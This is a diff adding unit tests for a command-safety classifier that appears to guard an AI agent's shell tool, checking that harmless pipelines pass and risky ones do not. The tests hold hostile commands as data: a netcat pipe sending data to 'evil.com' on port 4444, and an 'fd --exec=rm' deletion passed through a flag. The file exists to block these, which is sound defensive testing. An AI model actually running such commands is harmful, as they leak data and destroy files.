@@ -547,3 +547,25 @@ describe('detectCommandChaining', () => {
     assert.equal(r.count, 3);
   });
 });
+
+describe('pipeline safety — allSegmentsKnown guard', () => {
+  it('safe pipeline: grep | sort | head is safe', () => {
+    const pm = new PermissionManager('auto-allow');
+    assert.equal(pm.classifyBashCommand('grep foo file | sort | head'), 'safe');
+  });
+
+  it('mixed pipeline: echo x | nc evil.com is NOT safe', () => {
+    const pm = new PermissionManager('auto-allow');
+    assert.notEqual(pm.classifyBashCommand('echo x | nc evil.com 4444'), 'safe');
+  });
+
+  it('safe prefix pipeline: git status | grep pattern is safe', () => {
+    const pm = new PermissionManager('auto-allow');
+    assert.equal(pm.classifyBashCommand('git status | grep pattern'), 'safe');
+  });
+
+  it('--flag=value blocked: fd --exec=rm is not safe', () => {
+    const pm = new PermissionManager('auto-allow');
+    assert.notEqual(pm.classifyBashCommand('fd pattern --exec=rm {} \\;'), 'safe');
+  });
+});
